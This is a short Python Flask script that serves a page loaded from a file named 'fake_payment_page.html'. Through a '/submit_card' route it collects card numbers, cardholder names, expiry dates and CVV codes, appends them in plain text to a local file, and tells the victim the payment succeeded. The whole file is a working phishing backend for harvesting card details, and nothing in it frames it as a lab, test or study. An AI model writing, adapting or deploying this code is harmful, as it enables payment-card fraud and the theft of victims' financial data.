from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

data_file = "card_data.txt"

@app.route('/')
def home():
    return render_template_string(open("fake_payment_page.html").read())

@app.route('/submit_card', methods=['POST'])
def submit_card_data():
    # Get the form data
    card_number = request.form.get('card_number')
    cardholder_name = request.form.get('cardholder_name')
    expiry_date = request.form.get('expiry_date')
    cvv = request.form.get('cvv')

    # Ensure that all fields are filled
    if card_number and cardholder_name and expiry_date and cvv:
        # Save the data into a text file
        with open(data_file, 'a') as file:
            file.write(f"Card Number: {card_number}, Cardholder Name: {cardholder_name}, Expiry Date: {expiry_date}, CVV: {cvv}\n")
        return "Payment Details Collected Successfully!"
    else:
        return "Missing Information. Please Try Again."

if __name__ == '__main__':
    # Ensure the text file exists or create it if necessary
    if not os.path.exists(data_file):
        with open(data_file, 'w') as f:
            pass  # Create the file if it doesn't exist
    app.run(debug=True, port=5000)
